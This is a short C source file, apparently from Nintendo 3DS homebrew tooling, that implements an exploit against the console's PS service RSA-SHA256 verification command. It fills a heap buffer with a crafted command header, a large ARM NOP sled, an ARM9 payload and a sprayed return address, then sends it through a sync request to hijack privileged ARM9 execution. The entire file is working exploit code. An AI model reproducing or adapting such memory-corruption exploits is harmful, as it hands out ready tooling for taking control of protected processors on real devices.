#include "rsa_exploit.h"
#include "arm9.h"
#include "svc.h"

Result PS_VerifyRsaSha256_Exploit(Handle *handle, u32 bufSize, u32 baseAddr)
{
    Result ret = 0;
    u32 *cmdbuf = getThreadCommandBuffer();

    u32* buffer = (u32 *)0x18400000; // linear heap
    memset(buffer, 0, bufSize);

    buffer[0x28/sizeof(u32)] = 0x820002;
    buffer[0x2C/sizeof(u32)] = (u32)(buffer + 0x80/sizeof(u32));
    buffer[0x30/sizeof(u32)] = (bufSize << 4) | 0xA;
    buffer[0x34/sizeof(u32)] = (u32)(buffer + 0x380/sizeof(u32));
    buffer[0x280/sizeof(u32)] = bufSize<<3; //RSA bit-size, for the signature.

    u32 *ptr = buffer+0x380/sizeof(u32);
    u32 size;
    const u32 *src = (const u32 *)getArm9Payload(&size);
    u32 nopsled = 0x1000; // FIXME do we need such a  large NOP sled?

    for(u32 i = 0; i < nopsled/sizeof(u32); i++)
        *ptr++ = 0xE1A00000;

    memcpy(ptr, src, size);
    ptr += size/sizeof(u32);

    for(u32 i=0; i < bufSize-size-nopsled; i+=4)
        *ptr++ = baseAddr;

    memcpy(cmdbuf, buffer, 0x80);

    cmdbuf[0] = 0x00020244;

    if((ret = svcSendSyncRequest(*handle))!=0) return ret;

    //We do not expect to return from the syncRequest
    return (Result)cmdbuf[1];
}
